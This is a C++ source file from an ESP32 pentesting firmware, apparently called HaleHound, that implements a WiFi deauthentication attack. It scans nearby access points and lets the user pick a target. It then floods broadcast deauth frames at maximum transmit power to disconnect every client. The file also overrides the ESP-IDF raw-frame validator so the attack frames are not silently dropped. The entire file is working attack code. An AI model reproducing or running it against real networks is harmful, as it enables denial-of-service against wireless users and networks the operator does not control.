// ═══════════════════════════════════════════════════════════════════════════
// HaleHound WiFi Deauther — implementation
// Created: 2026-09-18 (T-Embed CC1101 port, roadmap §7 phase 6 continued)
// ═══════════════════════════════════════════════════════════════════════════

#include "deauther.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "cyd_config.h"
#include "messaging.h"
#include "radio_manager.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#define DEAUTH_MAX_APS         32
#define DEAUTH_RESULT_LINE_LEN 40
#define DEAUTH_PACKETS_PER_BURST 10   // matches wifi_attacks.cpp's Deauther default
#define DEAUTH_HEAP_FLOOR_BYTES 20000
#define DEAUTH_FAIL_RESTART_THRESHOLD 10
#define DEAUTH_STATUS_INTERVAL_MS 500 // matches the original's stats-display throttle

// ── AP list (SCAN phase) — same shape as eapol_sniff.cpp's APInfo, kept
// duplicated per this project's own stated precedent (subghz_sentinel.h:
// "duplicated, not shared — extract a shared helper once a third module
// needs it") ─────────────────────────────────────────────────────────────
struct APInfo {
    uint8_t bssid[6];
    char ssid[33];
    int rssi;
    uint8_t channel;
};
static APInfo s_apList[DEAUTH_MAX_APS];
static int s_apCount = 0;
static int s_selectedAP = -1;

static char s_apLineBuf[DEAUTH_MAX_APS][DEAUTH_RESULT_LINE_LEN];
static const char *s_apLinePtrs[DEAUTH_MAX_APS];

static TaskHandle_t s_workerHandle = NULL;
static QueueHandle_t s_cmdQueue = NULL;
static SemaphoreHandle_t s_doneSem = NULL;

// ── TX task state (ATTACK phase) ─────────────────────────────────────────
static TaskHandle_t s_txTaskHandle = NULL;
static volatile bool s_txRunning = false;
static volatile bool s_txDone = false;
static volatile uint32_t s_packetCount = 0;
static volatile uint32_t s_successCount = 0;
static volatile uint32_t s_consecutiveFailures = 0;

// Deauthentication frame template — identical to wifi_attacks.cpp's
// Deauther::deauth_frame_default (broadcast receiver = deauth every client
// of the AP, the original's own default; per-station targeting is
// StationScan's namespace, not ported here — see deauther.h).
static const uint8_t DEAUTH_FRAME_TEMPLATE[26] = {
    0xC0, 0x00,                         // type/subtype: deauth
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (broadcast)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP BSSID, filled in per-target)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP BSSID, filled in per-target)
    0x00, 0x00,                         // fragment & sequence
    0x07, 0x00                          // reason code
};

// Override ESP-IDF's raw-frame validator — ported from wifi_attacks.cpp's
// identical override. The stock libnet80211.a sanity check silently drops
// management frames outside a small allow-list (beacon/probe/auth), which
// includes deauth (subtype 12) — without this, esp_wifi_80211_tx() reports
// ESP_OK but the frame never leaves the radio, so the attack looks "on"
// while doing nothing (the actual symptom reported: "wifi deauth does not
// work"). This IS a strong symbol in this framework version's
// libnet80211.a, so overriding it needs -Wl,--allow-multiple-definition
// (added to this env in platformio.ini, mirroring the CYD env's own
// existing use of that flag for the same reason) — a previous pass here
// mistakenly assumed the override was unnecessary and dropped both it and
// the flag; restoring both fixes the attack. Defined once here (not
// per-file) since it's a single global C symbol shared by every raw-TX
// module in this port (auth_flood.cpp, beacon_spammer.cpp), same as the
// original sharing one definition across its single translation unit.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

static void sendDeauthFrame(const uint8_t *bssid) {
    uint8_t frame[sizeof(DEAUTH_FRAME_TEMPLATE)];
    memcpy(frame, DEAUTH_FRAME_TEMPLATE, sizeof(frame));
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);

    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    s_packetCount++;
    if (res == ESP_OK) {
        s_successCount++;
        s_consecutiveFailures = 0;
    } else {
        s_consecutiveFailures++;
    }
}

// Raw ESP-IDF APSTA + hidden AP — ported from Deauther::initAttackMode().
// No promiscuous RX needed here (TX-only), unlike eapol_sniff.cpp's
// initPromiscuous().
static void initAttackMode() {
    WiFi.mode(WIFI_OFF);
    delay(50);

    // Explicit stop+deinit+delay before re-init — ported from the
    // original's initAttackMode(). Without this, the scan phase's
    // WiFi.mode(WIFI_STA) has already lazily esp_wifi_init()'d the driver
    // (Arduino core does this internally), so the esp_wifi_init() below is
    // a silent no-op against a driver still configured for STA-only,
    // leaving WIFI_IF_AP never properly brought up for raw TX.
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_start();

    wifi_config_t apConfig;
    memset(&apConfig, 0, sizeof(apConfig));
    strncpy((char *)apConfig.ap.ssid, "HaleHound", sizeof(apConfig.ap.ssid));
    apConfig.ap.ssid_len = 9;
    apConfig.ap.ssid_hidden = 1;
    apConfig.ap.max_connection = 0;
    apConfig.ap.authmode = WIFI_AUTH_OPEN;
    apConfig.ap.beacon_interval = 60000;
    esp_wifi_set_config(WIFI_IF_AP, &apConfig);

    esp_wifi_set_max_tx_power(82);
    esp_wifi_set_ps(WIFI_PS_NONE);
}

static void exitAttackMode() {
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);
}

// Core 0 tight-loop TX task — ported from Deauther::dtTxTask(). Runs at
// "maximum rate" (no queue polling inside the loop, just a volatile flag),
// same heap-safety abort and consecutive-failure WiFi restart as the
// original.
static void deautherTxTask(void *param) {
    (void)param;

    esp_wifi_set_channel(s_apList[s_selectedAP].channel, WIFI_SECOND_CHAN_NONE);

    while (s_txRunning) {
        if (ESP.getFreeHeap() < DEAUTH_HEAP_FLOOR_BYTES) {
            #if CYD_DEBUG
            Serial.println("[DEAUTHER] HEAP LOW — stopping TX task");
            #endif
            break;
        }

        if (s_consecutiveFailures > DEAUTH_FAIL_RESTART_THRESHOLD) {
            #if CYD_DEBUG
            Serial.println("[DEAUTHER] 10+ consecutive failures — restarting WiFi");
            #endif
            esp_wifi_stop();
            vTaskDelay(pdMS_TO_TICKS(200));
            esp_wifi_start();
            vTaskDelay(pdMS_TO_TICKS(200));
            esp_wifi_set_channel(s_apList[s_selectedAP].channel, WIFI_SECOND_CHAN_NONE);
            s_consecutiveFailures = 0;
        }

        for (int i = 0; i < DEAUTH_PACKETS_PER_BURST && s_txRunning; i++) {
            sendDeauthFrame(s_apList[s_selectedAP].bssid);
        }

        vTaskDelay(1); // yield to feed the watchdog, matches the original
    }

    s_txDone = true;
    vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════
// SCAN PHASE — near-verbatim reuse of eapol_sniff.cpp's scanWorkerTask
// pattern (async scan + poll, full AP structs since the ATTACK phase needs
// BSSID/channel).
// ═══════════════════════════════════════════════════════════════════════════

static void formatApResults() {
    for (int i = 0; i < s_apCount; i++) {
        const char *ssid = (s_apList[i].ssid[0] != '\0') ? s_apList[i].ssid : "[Hidden]";
        snprintf(s_apLineBuf[i], DEAUTH_RESULT_LINE_LEN, "%s CH%d %ddBm",
                 ssid, s_apList[i].channel, s_apList[i].rssi);
        s_apLinePtrs[i] = s_apLineBuf[i];
    }
    if (s_apCount == 0) {
        snprintf(s_apLineBuf[0], DEAUTH_RESULT_LINE_LEN, "(no APs found)");
        s_apLinePtrs[0] = s_apLineBuf[0];
        s_apCount = 1;
    }
}

static void scanWorkerTask(void *param) {
    (void)param;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    WiFi.scanNetworks(true /* async */, true /* show hidden */);

    for (;;) {
        int n = WiFi.scanComplete();
        if (n >= 0) {
            s_apCount = 0;
            for (int i = 0; i < n && s_apCount < DEAUTH_MAX_APS; i++) {
                memcpy(s_apList[s_apCount].bssid, WiFi.BSSID(i), 6);
                strncpy(s_apList[s_apCount].ssid, WiFi.SSID(i).c_str(), 32);
                s_apList[s_apCount].ssid[32] = '\0';
                s_apList[s_apCount].rssi = WiFi.RSSI(i);
                s_apList[s_apCount].channel = WiFi.channel(i);
                s_apCount++;
            }
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            formatApResults();

            RenderMsg msg;
            msg.kind = RENDER_MSG_SCAN_COMPLETE;
            messagingPostTelemetry(msg);
            break;
        }

        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, pdMS_TO_TICKS(100)) == pdTRUE && cmd.type == CMD_STOP) {
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            goto cleanup;
        }
    }

    // Results are up; wait here until told to stop (mirrors wifi_scan.cpp).
    for (;;) {
        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, portMAX_DELAY) == pdTRUE && cmd.type == CMD_STOP) {
            break;
        }
    }

cleanup:
    radioRelease(RADIO_WIFI);
    xSemaphoreGive(s_doneSem);
    vTaskDelete(NULL);
}

void deautherScanStart() {
    if (!radioAcquire(RADIO_WIFI)) {
        #if CYD_DEBUG
        Serial.println("[DEAUTHER] ERROR: could not acquire radio for scan");
        #endif
        return;
    }

    s_apCount = 0;
    s_selectedAP = -1;
    s_cmdQueue = messagingCreateCmdQueue();
    s_doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(scanWorkerTask, "deauther_scan", 6144, NULL, 2, &s_workerHandle, 0);
}

void deautherScanStop() {
    if (!s_cmdQueue) return;

    Cmd cmd;
    cmd.type = CMD_STOP;
    xQueueSend(s_cmdQueue, &cmd, portMAX_DELAY);
    xSemaphoreTake(s_doneSem, portMAX_DELAY);

    vQueueDelete(s_cmdQueue);
    vSemaphoreDelete(s_doneSem);
    s_cmdQueue = NULL;
    s_doneSem = NULL;
    s_workerHandle = NULL;
}

const char *const *deautherGetApResultLines() {
    return s_apLinePtrs;
}

int deautherGetApResultCount() {
    return s_apCount;
}

// ═══════════════════════════════════════════════════════════════════════════
// ATTACK PHASE — outer command/status loop (this task) drives the tight-loop
// TX task (above), same split as Deauther's own Core0-TX/Core1-UI split.
// ═══════════════════════════════════════════════════════════════════════════

static void attackWorkerTask(void *param) {
    (void)param;

    s_packetCount = 0;
    s_successCount = 0;
    s_consecutiveFailures = 0;

    initAttackMode();

    s_txDone = false;
    s_txRunning = true;
    xTaskCreatePinnedToCore(deautherTxTask, "deauther_tx", 4096, NULL, 1, &s_txTaskHandle, 0);

    uint32_t lastStatus = 0;

    for (;;) {
        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, pdMS_TO_TICKS(100)) == pdTRUE && cmd.type == CMD_STOP) {
            break;
        }

        uint32_t now = millis();
        if (now - lastStatus >= DEAUTH_STATUS_INTERVAL_MS) {
            lastStatus = now;
            uint32_t pkts = s_packetCount;
            uint32_t ok = s_successCount;
            float rate = (pkts > 0) ? ((float)ok / pkts * 100.0f) : 0.0f;

            RenderMsg msg;
            msg.kind = RENDER_MSG_STATUS_TEXT;
            snprintf(msg.payload.text, RENDER_MSG_TEXT_MAX, "CH%d TX:%lu OK:%.0f%%",
                     s_apList[s_selectedAP].channel, (unsigned long)pkts, rate);
            messagingPostTelemetry(msg);
        }
    }

    s_txRunning = false;
    uint32_t waitStart = millis();
    while (!s_txDone && (millis() - waitStart < 500)) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    s_txTaskHandle = NULL;

    exitAttackMode();
    WiFi.mode(WIFI_OFF);
    delay(50);

    radioRelease(RADIO_WIFI);
    xSemaphoreGive(s_doneSem);
    vTaskDelete(NULL);
}

void deautherSelectTarget(int index) {
    if (index < 0 || index >= s_apCount) return;
    s_selectedAP = index;

    if (!radioAcquire(RADIO_WIFI)) {
        #if CYD_DEBUG
        Serial.println("[DEAUTHER] ERROR: could not acquire radio for attack");
        #endif
        return;
    }

    s_cmdQueue = messagingCreateCmdQueue();
    s_doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(attackWorkerTask, "deauther_atk", 4096, NULL, 2, &s_workerHandle, 0);
}

void deautherSetTarget(const uint8_t bssid[6], const char *ssid, uint8_t channel) {
    memcpy(s_apList[0].bssid, bssid, 6);
    strncpy(s_apList[0].ssid, ssid, 32);
    s_apList[0].ssid[32] = '\0';
    s_apList[0].rssi = 0;
    s_apList[0].channel = channel;
    s_apCount = 1;

    deautherSelectTarget(0);
}

void deautherAttackStop() {
    if (!s_cmdQueue) return;

    Cmd cmd;
    cmd.type = CMD_STOP;
    xQueueSend(s_cmdQueue, &cmd, portMAX_DELAY);
    xSemaphoreTake(s_doneSem, portMAX_DELAY);

    vQueueDelete(s_cmdQueue);
    vSemaphoreDelete(s_doneSem);
    s_cmdQueue = NULL;
    s_doneSem = NULL;
    s_workerHandle = NULL;
}
